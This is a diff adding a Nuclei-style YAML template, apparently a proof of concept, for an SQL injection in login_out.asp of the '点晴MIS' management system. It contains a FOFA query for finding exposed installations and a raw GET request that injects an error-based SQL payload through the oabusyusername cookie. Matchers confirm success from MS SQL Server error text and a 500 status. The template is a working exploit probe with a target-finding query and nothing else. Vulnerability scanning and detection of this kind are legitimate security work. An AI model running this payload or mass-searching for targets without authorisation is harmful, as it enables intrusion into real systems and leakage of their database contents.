@@ -1,0 +1,28 @@
+id: dianqing-mis-login_out-sqli
+
+info:
+  name: "点晴MIS login_out.asp 文件 SQL注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="点晴MIS管理信息系统"
+      该漏洞源于login_out.asp文件在处理用户输入时未正确过滤特殊字符，攻击者可通过构造恶意SQL语句实现数据库查询操控，可能导致敏感信息泄露或数据完整性受损。
+  tags: 点晴MIS
+
+http:
+  - raw:
+      - |
+        GET /login_out.asp HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: oabusyusername=1'+and+@@VERSION>1--
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nvarchar'
+          - 'Microsoft SQL Server'
+        condition: and
+      - type: status
+        status: 
+          - 500
